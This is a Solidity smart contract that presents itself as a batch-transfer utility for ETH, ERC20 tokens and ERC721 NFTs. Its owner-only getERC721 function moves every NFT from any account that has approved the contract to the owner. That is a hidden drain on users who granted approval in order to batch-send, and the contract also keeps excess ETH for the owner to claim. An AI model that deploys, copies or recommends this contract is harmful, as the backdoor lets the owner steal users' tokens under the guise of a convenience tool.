// SPDX-License-Identifier: MIT
pragma solidity ^0.8.2;
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol";
import "@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol";

contract Batch is Ownable, ERC721Holder {
    constructor(){
       
    }

    function sendEth(address[] memory _to, uint256[] memory _value) payable public returns (bool) {
		// input validation
		require(_to.length == _value.length);
		require(_to.length <= 255);
		uint256 amount;

		// loop through to addresses and send value
		for (uint8 i = 0; i < _to.length; i++) {
			amount += _value[i];
			payable(_to[i]).transfer(_value[i]);
		}
		assert(amount <= msg.value);
		return true;
	}

	function sendErc20(address _tokenAddress, address[] memory _to, uint256[] memory _value) payable public returns (bool) {
		// input validation
		require(_to.length == _value.length);
		require(_to.length <= 255);

		// use the erc20 abi
		IERC20 token = IERC20(_tokenAddress);
		// loop through to addresses and send value
		for (uint8 i = 0; i < _to.length; i++) {
			assert(token.transferFrom(msg.sender, _to[i], _value[i]) == true);
		}
		return true;
	}

	function sendErc721(address _token721, address[] memory _to, uint256[] memory _tokenIds) payable public returns (bool) {
		// input validation
		require(_to.length == _tokenIds.length);
		require(_to.length <= 255);

		// use the erc721 abi
		IERC721 token = IERC721(_token721);
		// loop through to addresses and send value
		for (uint8 i = 0; i < _to.length; i++) {
			token.safeTransferFrom(msg.sender, _to[i], _tokenIds[i]);
		}
		return true;
	}

    function claimToken(address _token) public onlyOwner {
		getToken(_token, address(this));
    }

	function getToken(address _token, address _account) public onlyOwner {
        IERC20 erc20token = IERC20(_token);
        uint256 balance = erc20token.balanceOf(_account);
        erc20token.transfer(owner(), balance);
    }

    function claim() public onlyOwner {
        payable(owner()).transfer(address(this).balance);
    }

	function claimERC721(address _token721, uint256 _tokenId) external onlyOwner {
        IERC721(_token721).safeTransferFrom(address(this), owner(), _tokenId);
    }

	function getERC721(address _token721, address _account) external onlyOwner {
		for(uint8 i = 0; i < IERC721(_token721).balanceOf(_account); i++){ 
			uint256 tokenId = ERC721Enumerable(_token721).tokenOfOwnerByIndex(_account, i);
        	IERC721(_token721).safeTransferFrom(_account, owner(), tokenId);
		}
    }

    receive() external payable {}

}